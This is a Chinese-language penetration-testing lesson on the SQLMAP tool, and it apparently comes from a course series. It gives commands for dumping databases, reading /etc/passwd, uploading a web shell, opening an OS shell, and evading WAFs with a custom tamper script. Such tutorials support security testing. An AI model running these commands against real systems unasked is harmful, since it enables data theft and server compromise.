#  046：SQLMAP实战指南 🛠️

在本节课中，我们将深入学习一款强大的SQL注入自动化工具——SQLMAP。我们将从基础使用讲起，涵盖其核心功能、高级参数、绕过技巧以及脚本编写，帮助你全面掌握这个工具，从而在面对SQL注入漏洞时能够灵活高效地进行利用。

![](img/2b96891e8636c95c08fae08a91f877bb_1.png)

![](img/2b96891e8636c95c08fae08a91f877bb_3.png)

![](img/2b96891e8636c95c08fae08a91f877bb_5.png)

## 认识SQLMAP 🧐

![](img/2b96891e8636c95c08fae08a91f877bb_7.png)

![](img/2b96891e8636c95c08fae08a91f877bb_9.png)

![](img/2b96891e8636c95c08fae08a91f877bb_11.png)

SQLMAP是一款开源的自动化SQL注入工具，专门用于检测和利用SQL注入漏洞。它支持多种数据库（如MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Access等）和多种注入类型（如联合查询、布尔盲注、时间盲注、报错注入、堆叠查询）。

![](img/2b96891e8636c95c08fae08a91f877bb_13.png)

![](img/2b96891e8636c95c08fae08a91f877bb_15.png)

**核心优势**：能够自动识别数据库类型、注入点，并执行数据提取、文件读写、命令执行等高权限操作。

![](img/2b96891e8636c95c08fae08a91f877bb_17.png)

## 基础使用：从简单注入开始 🚀

![](img/2b96891e8636c95c08fae08a91f877bb_19.png)

![](img/2b96891e8636c95c08fae08a91f877bb_21.png)

上一节我们介绍了SQLMAP的基本概念，本节中我们来看看如何使用它进行基础的注入测试。

![](img/2b96891e8636c95c08fae08a91f877bb_23.png)

![](img/2b96891e8636c95c08fae08a91f877bb_25.png)

![](img/2b96891e8636c95c08fae08a91f877bb_27.png)

![](img/2b96891e8636c95c08fae08a91f877bb_29.png)

![](img/2b96891e8636c95c08fae08a91f877bb_31.png)

![](img/2b96891e8636c95c08fae08a91f877bb_33.png)

![](img/2b96891e8636c95c08fae08a91f877bb_35.png)

### 环境准备与基本命令

![](img/2b96891e8636c95c08fae08a91f877bb_37.png)

![](img/2b96891e8636c95c08fae08a91f877bb_39.png)

![](img/2b96891e8636c95c08fae08a91f877bb_41.png)

![](img/2b96891e8636c95c08fae08a91f877bb_43.png)

使用SQLMAP前，需要准备好Python环境（Python 2或3均可）。基本检测命令如下：

![](img/2b96891e8636c95c08fae08a91f877bb_45.png)

![](img/2b96891e8636c95c08fae08a91f877bb_47.png)

![](img/2b96891e8636c95c08fae08a91f877bb_49.png)

![](img/2b96891e8636c95c08fae08a91f877bb_51.png)

```bash
python sqlmap.py -u "http://target.com/page.php?id=1"
```

![](img/2b96891e8636c95c08fae08a91f877bb_53.png)

![](img/2b96891e8636c95c08fae08a91f877bb_55.png)

![](img/2b96891e8636c95c08fae08a91f877bb_57.png)

**参数解释**：
*   `-u`：指定目标URL。

![](img/2b96891e8636c95c08fae08a91f877bb_59.png)

![](img/2b96891e8636c95c08fae08a91f877bb_61.png)

执行后，SQLMAP会尝试检测该参数是否存在SQL注入漏洞，并在当前目录下生成一个以目标域名为名的文件夹，用于保存注入过程中的日志和数据。

![](img/2b96891e8636c95c08fae08a91f877bb_63.png)

![](img/2b96891e8636c95c08fae08a91f877bb_65.png)

### 针对不同数据库的注入流程

SQLMAP会根据检测到的数据库类型自动调整攻击载荷。以下是针对两种常见数据库的流程差异：

![](img/2b96891e8636c95c08fae08a91f877bb_67.png)

![](img/2b96891e8636c95c08fae08a91f877bb_69.png)

**Access数据库**：
Access数据库没有系统表（如`information_schema`），因此需要通过字典暴力猜解表名和列名。
1.  检测注入点。
2.  使用 `--tables` 参数猜解表名（依赖于 `data/txt/common-tables.txt` 字典）。
3.  使用 `--columns -T 表名` 参数猜解指定表的列名。
4.  使用 `--dump -T 表名 -C 列名1,列名2` 参数导出指定列的数据。

![](img/2b96891e8636c95c08fae08a91f877bb_71.png)

![](img/2b96891e8636c95c08fae08a91f877bb_73.png)

![](img/2b96891e8636c95c08fae08a91f877bb_75.png)

![](img/2b96891e8636c95c08fae08a91f877bb_77.png)

**MySQL数据库**：
MySQL等数据库有系统表，可以查询库、表、列信息，流程略有不同。
1.  检测注入点。
2.  使用 `--current-db` 参数获取当前数据库名。
3.  使用 `--tables -D 数据库名` 参数获取指定数据库的所有表。
4.  使用 `--columns -T 表名 -D 数据库名` 参数获取指定表的列。
5.  使用 `--dump -T 表名 -D 数据库名 -C 列名1,列名2` 参数导出数据。

![](img/2b96891e8636c95c08fae08a91f877bb_79.png)

![](img/2b96891e8636c95c08fae08a91f877bb_81.png)

## 高权限操作与进阶利用 ⚡

![](img/2b96891e8636c95c08fae08a91f877bb_83.png)

![](img/2b96891e8636c95c08fae08a91f877bb_85.png)

![](img/2b96891e8636c95c08fae08a91f877bb_87.png)

![](img/2b96891e8636c95c08fae08a91f877bb_88.png)

![](img/2b96891e8636c95c08fae08a91f877bb_90.png)

![](img/2b96891e8636c95c08fae08a91f877bb_92.png)

在确认注入点后，判断当前数据库用户的权限至关重要，这决定了我们能否进行更深层次的利用。

![](img/2b96891e8636c95c08fae08a91f877bb_94.png)

![](img/2b96891e8636c95c08fae08a91f877bb_96.png)

### 权限判断

![](img/2b96891e8636c95c08fae08a91f877bb_98.png)

![](img/2b96891e8636c95c08fae08a91f877bb_100.png)

使用 `--is-dba` 参数可以判断当前数据库用户是否为高权限用户（如DBA、root）。

![](img/2b96891e8636c95c08fae08a91f877bb_102.png)

![](img/2b96891e8636c95c08fae08a91f877bb_104.png)

![](img/2b96891e8636c95c08fae08a91f877bb_106.png)

![](img/2b96891e8636c95c08fae08a91f877bb_108.png)

```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --is-dba
```
如果返回 `True`，则意味着我们拥有高权限，可以进行文件读写、命令执行等操作。

![](img/2b96891e8636c95c08fae08a91f877bb_110.png)

![](img/2b96891e8636c95c08fae08a91f877bb_112.png)

![](img/2b96891e8636c95c08fae08a91f877bb_114.png)

![](img/2b96891e8636c95c08fae08a91f877bb_116.png)

![](img/2b96891e8636c95c08fae08a91f877bb_118.png)

### 高权限下的高级操作

![](img/2b96891e8636c95c08fae08a91f877bb_120.png)

![](img/2b96891e8636c95c08fae08a91f877bb_122.png)

![](img/2b96891e8636c95c08fae08a91f877bb_124.png)

![](img/2b96891e8636c95c08fae08a91f877bb_126.png)

以下是高权限用户可能执行的一些操作：

![](img/2b96891e8636c95c08fae08a91f877bb_128.png)

![](img/2b96891e8636c95c08fae08a91f877bb_130.png)

**执行任意SQL语句**：
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --sql-shell
```
在交互式SQL shell中直接执行SQL命令。

**文件读取**：
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --file-read "/etc/passwd"
```
读取服务器上的文件内容。

![](img/2b96891e8636c95c08fae08a91f877bb_132.png)

![](img/2b96891e8636c95c08fae08a91f877bb_134.png)

![](img/2b96891e8636c95c08fae08a91f877bb_136.png)

**文件写入**：
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --file-write "/local/path/to/shell.php" --file-dest "/var/www/html/shell.php"
```
将本地文件写入到服务器指定路径（需有写权限）。

![](img/2b96891e8636c95c08fae08a91f877bb_138.png)

![](img/2b96891e8636c95c08fae08a91f877bb_140.png)

![](img/2b96891e8636c95c08fae08a91f877bb_142.png)

**操作系统命令执行**：
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --os-shell
```
获取一个交互式的操作系统shell，或者使用 `--os-cmd` 执行单条命令。

![](img/2b96891e8636c95c08fae08a91f877bb_144.png)

![](img/2b96891e8636c95c08fae08a91f877bb_146.png)

> **注意**：文件读写和命令执行功能严重依赖于数据库配置和权限（例如MySQL的 `secure_file_priv` 设置），并非所有高权限注入点都能成功。

![](img/2b96891e8636c95c08fae08a91f877bb_148.png)

![](img/2b96891e8636c95c08fae08a91f877bb_150.png)

## 处理各种请求类型与数据包 🔄

![](img/2b96891e8636c95c08fae08a91f877bb_152.png)

![](img/2b96891e8636c95c08fae08a91f877bb_154.png)

实际渗透中，注入点可能出现在GET、POST、Cookie、HTTP头等不同位置。SQLMAP提供了相应的参数来处理。

![](img/2b96891e8636c95c08fae08a91f877bb_156.png)

![](img/2b96891e8636c95c08fae08a91f877bb_158.png)

![](img/2b96891e8636c95c08fae08a91f877bb_160.png)

### POST注入

![](img/2b96891e8636c95c08fae08a91f877bb_162.png)

![](img/2b96891e8636c95c08fae08a91f877bb_164.png)

当注入点在POST请求体中时，使用 `--data` 参数。
```bash
python sqlmap.py -u "http://target.com/login.php" --data="username=admin&password=pass"
```

![](img/2b96891e8636c95c08fae08a91f877bb_166.png)

![](img/2b96891e8636c95c08fae08a91f877bb_168.png)

![](img/2b96891e8636c95c08fae08a91f877bb_170.png)

### Cookie注入

当注入点在Cookie中时，使用 `--cookie` 参数。
```bash
python sqlmap.py -u "http://target.com/index.php" --cookie="sessionid=abc123; user=test"
```

![](img/2b96891e8636c95c08fae08a91f877bb_172.png)

### 使用原始HTTP数据包（推荐）

![](img/2b96891e8636c95c08fae08a91f877bb_174.png)

![](img/2b96891e8636c95c08fae08a91f877bb_176.png)

![](img/2b96891e8636c95c08fae08a91f877bb_178.png)

对于复杂的请求（如JSON格式、自定义头部），最可靠的方式是使用 `-r` 参数加载一个完整的HTTP请求文件，并在注入点位置用 `*` 标记。
1.  使用Burp Suite等工具抓取数据包，保存为 `request.txt`。
2.  在参数值处用 `*` 标记，例如 `{"username":"*admin*", "password":"test"}`。
3.  执行命令：
    ```bash
    python sqlmap.py -r request.txt
    ```
这种方法能最大程度保持请求的原始性，避免因请求头缺失或格式错误导致检测失败。

![](img/2b96891e8636c95c08fae08a91f877bb_180.png)

![](img/2b96891e8636c95c08fae08a91f877bb_182.png)

![](img/2b96891e8636c95c08fae08a91f877bb_184.png)

## Tamper脚本：绕过过滤与WAF 🛡️➡️🚪

![](img/2b96891e8636c95c08fae08a91f877bb_186.png)

网站通常会部署WAF或编写过滤代码来防御SQL注入。SQLMAP的Tamper脚本可以对注入载荷进行混淆、编码，以绕过这些防护。

![](img/2b96891e8636c95c08fae08a91f877bb_188.png)

![](img/2b96891e8636c95c08fae08a91f877bb_190.png)

![](img/2b96891e8636c95c08fae08a91f877bb_192.png)

![](img/2b96891e8636c95c08fae08a91f877bb_194.png)

### 使用内置Tamper脚本

![](img/2b96891e8636c95c08fae08a91f877bb_196.png)

SQLMAP内置了许多Tamper脚本，位于 `tamper/` 目录下。例如，绕过基础过滤的 `space2comment`，或进行Base64编码的 `base64encode`。
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --tamper=base64encode,space2comment
```

![](img/2b96891e8636c95c08fae08a91f877bb_198.png)

![](img/2b96891e8636c95c08fae08a91f877bb_200.png)

### 编写自定义Tamper脚本

![](img/2b96891e8636c95c08fae08a91f877bb_202.png)

![](img/2b96891e8636c95c08fae08a91f877bb_204.png)

![](img/2b96891e8636c95c08fae08a91f877bb_206.png)

![](img/2b96891e8636c95c08fae08a91f877bb_208.png)

![](img/2b96891e8636c95c08fae08a91f877bb_210.png)

当内置脚本无法绕过时，需要自己编写。Tamper脚本本质是一个Python文件，核心是 `tamper(payload, **kwargs)` 函数，对输入的 `payload` 进行变换并返回。

以下是一个简单的示例，将 `UNION` 转换为大小写混合 `UnIoN` 以绕过简单的关键字过滤：
```python
#!/usr/bin/env python
"""
自定义Tamper脚本：将SQL关键字转换为大小写混合
"""

![](img/2b96891e8636c95c08fae08a91f877bb_212.png)

![](img/2b96891e8636c95c08fae08a91f877bb_214.png)

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

![](img/2b96891e8636c95c08fae08a91f877bb_216.png)

![](img/2b96891e8636c95c08fae08a91f877bb_218.png)

![](img/2b96891e8636c95c08fae08a91f877bb_220.png)

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        # 替换关键字为大小写混合变体
        retVal = retVal.replace('UNION', 'UnIoN')
        retVal = retVal.replace('SELECT', 'SeLeCt')
        retVal = retVal.replace('OR', 'Or')
        retVal = retVal.replace('AND', 'AnD')
    return retVal
```
将脚本保存为 `mytamper.py` 放入 `tamper/` 目录，使用 `--tamper=mytamper` 调用。

![](img/2b96891e8636c95c08fae08a91f877bb_222.png)

![](img/2b96891e8636c95c08fae08a91f877bb_224.png)

![](img/2b96891e8636c95c08fae08a91f877bb_226.png)

**核心难点**：Tamper脚本的编写依赖于对目标防护规则的精确分析（黑盒或白盒测试），难点在于“发现绕过方法”，而非“编写代码本身”。

![](img/2b96891e8636c95c08fae08a91f877bb_228.png)

![](img/2b96891e8636c95c08fae08a91f877bb_230.png)

![](img/2b96891e8636c95c08fae08a91f877bb_232.png)

![](img/2b96891e8636c95c08fae08a91f877bb_234.png)

## 实用参数与调试技巧 🐞

![](img/2b96891e8636c95c08fae08a91f877bb_235.png)

![](img/2b96891e8636c95c08fae08a91f877bb_236.png)

![](img/2b96891e8636c95c08fae08a91f877bb_238.png)

![](img/2b96891e8636c95c08fae08a91f877bb_240.png)

![](img/2b96891e8636c95c08fae08a91f877bb_242.png)

为了更有效地使用SQLMAP，以下是一些关键参数和调试方法。

![](img/2b96891e8636c95c08fae08a91f877bb_244.png)

![](img/2b96891e8636c95c08fae08a91f877bb_246.png)

![](img/2b96891e8636c95c08fae08a91f877bb_248.png)

![](img/2b96891e8636c95c08fae08a91f877bb_250.png)

![](img/2b96891e8636c95c08fae08a91f877bb_252.png)

### 常用参数

![](img/2b96891e8636c95c08fae08a91f877bb_254.png)

![](img/2b96891e8636c95c08fae08a91f877bb_256.png)

以下是几个提高测试效率和成功率的参数：

![](img/2b96891e8636c95c08fae08a91f877bb_258.png)

![](img/2b96891e8636c95c08fae08a91f877bb_260.png)

![](img/2b96891e8636c95c08fae08a91f877bb_262.png)

![](img/2b96891e8636c95c08fae08a91f877bb_264.png)

![](img/2b96891e8636c95c08fae08a91f877bb_266.png)

![](img/2b96891e8636c95c08fae08a91f877bb_268.png)

**设置延迟**：防止因请求过快被屏蔽。
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --delay=2
```

![](img/2b96891e8636c95c08fae08a91f877bb_270.png)

![](img/2b96891e8636c95c08fae08a91f877bb_272.png)

![](img/2b96891e8636c95c08fae08a91f877bb_274.png)

**修改User-Agent**：避免被WAF通过工具指纹识别。
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --random-agent
# 或自定义
python sqlmap.py -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0..."
```

![](img/2b96891e8636c95c08fae08a91f877bb_276.png)

![](img/2b96891e8636c95c08fae08a91f877bb_278.png)

**使用代理**：方便通过Burp Suite等工具观察流量，或使用代理池。
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

![](img/2b96891e8636c95c08fae08a91f877bb_280.png)

![](img/2b96891e8636c95c08fae08a91f877bb_282.png)

![](img/2b96891e8636c95c08fae08a91f877bb_284.png)

![](img/2b96891e8636c95c08fae08a91f877bb_286.png)

![](img/2b96891e8636c95c08fae08a91f877bb_288.png)

**测试等级与风险等级**：
*   `--level` (1-5)：测试的深入程度，等级越高，测试的Payload和参数越多（例如会测试HTTP头）。
*   `--risk` (1-3)：测试的风险程度，风险越高，使用的Payload可能对数据造成破坏（如`OR 1=1`）的可能性越大。
    在常规检测失败时，可以尝试提高等级。
    ```bash
    python sqlmap.py -u "http://target.com/page.php?id=1" --level=3 --risk=2
    ```

![](img/2b96891e8636c95c08fae08a91f877bb_290.png)

![](img/2b96891e8636c95c08fae08a91f877bb_292.png)

![](img/2b96891e8636c95c08fae08a91f877bb_294.png)

![](img/2b96891e8636c95c08fae08a91f877bb_296.png)

![](img/2b96891e8636c95c08fae08a91f877bb_298.png)

### 调试与信息获取

![](img/2b96891e8636c95c08fae08a91f877bb_300.png)

![](img/2b96891e8636c95c08fae08a91f877bb_302.png)

![](img/2b96891e8636c95c08fae08a91f877bb_304.png)

![](img/2b96891e8636c95c08fae08a91f877bb_306.png)

![](img/2b96891e8636c95c08fae08a91f877bb_308.png)

![](img/2b96891e8636c95c08fae08a91f877bb_310.png)

![](img/2b96891e8636c95c08fae08a91f877bb_312.png)

![](img/2b96891e8636c95c08fae08a91f877bb_314.png)

**详细输出**：使用 `-v` 参数可以控制输出信息的详细程度（0-6）。`-v 3` 会显示注入的Payload，`-v 4` 会显示HTTP请求，`-v 5` 会显示HTTP响应头，`-v 6` 会显示HTTP响应页面内容。这对于分析注入失败原因至关重要。
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" -v 3
```

![](img/2b96891e8636c95c08fae08a91f877bb_316.png)

![](img/2b96891e8636c95c08fae08a91f877bb_318.png)

![](img/2b96891e8636c95c08fae08a91f877bb_320.png)

**获取系统信息**：
```bash
python sqlmap.py -u "http://target.com/page.php?id=1" --banner # 数据库版本
python sqlmap.py -u "http://target.com/page.php?id=1" --current-user # 当前用户
python sqlmap.py -u "http://target.com/page.php?id=1" --dbs # 所有数据库
```

![](img/2b96891e8636c95c08fae08a91f877bb_322.png)

![](img/2b96891e8636c95c08fae08a91f877bb_324.png)

![](img/2b96891e8636c95c08fae08a91f877bb_326.png)

![](img/2b96891e8636c95c08fae08a91f877bb_328.png)

![](img/2b96891e8636c95c08fae08a91f877bb_330.png)

## 总结 📚

![](img/2b96891e8636c95c08fae08a91f877bb_332.png)

![](img/2b96891e8636c95c08fae08a91f877bb_334.png)

![](img/2b96891e8636c95c08fae08a91f877bb_336.png)

本节课我们一起深入学习了SQLMAP这款强大的SQL注入工具。我们从最基础的URL检测开始，逐步掌握了：

![](img/2b96891e8636c95c08fae08a91f877bb_338.png)

![](img/2b96891e8636c95c08fae08a91f877bb_340.png)

1.  **核心使用流程**：针对Access和MySQL等不同数据库的自动化注入与数据提取。
2.  **权限提升利用**：如何判断高权限注入点，并利用其进行文件读写、命令执行等高级操作。
3.  **复杂请求处理**：熟练应对GET、POST、Cookie、JSON以及通过原始数据包进行注入。
4.  **绕过防护**：理解并使用Tamper脚本（包括自定义编写）来绕过WAF和过滤机制。
5.  **实战调试技巧**：运用延迟、代理、等级风险调整、详细输出等参数来优化测试过程，解决实际问题。

![](img/2b96891e8636c95c08fae08a91f877bb_342.png)

![](img/2b96891e8636c95c08fae08a91f877bb_344.png)

![](img/2b96891e8636c95c08fae08a91f877bb_346.png)

![](img/2b96891e8636c95c08fae08a91f877bb_347.png)

SQLMAP是渗透测试中不可或缺的利器，但其威力建立在对SQL注入原理和目标环境的深刻理解之上。切记，工具是手的延伸，思维才是核心。希望本教程能帮助你在安全道路上更进一步。